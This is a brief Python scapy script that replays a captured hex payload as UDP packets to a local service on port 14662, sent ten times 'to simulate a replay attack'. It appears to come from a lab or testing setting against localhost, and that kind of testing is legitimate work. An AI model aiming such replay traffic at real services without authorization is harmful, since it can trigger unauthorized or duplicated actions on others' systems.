from scapy.all import *

# Payload extracted from Wireshark in hexadecimal format
payload = bytes.fromhex("770700000000000057a84485aba29086600bcc917a29ab0ecb07557d66d5354ad3197a0a18e3cea81e97d79cff52ae8021fe0850")  # Replace with your actual payload

# Construct the packet with the custom payload
packet = IP(dst="127.0.0.1")/UDP(dport=14662)/Raw(load=payload)

# Send the packet multiple times to simulate a replay attack
send(packet, count=10)  # Use count=10 for visibility
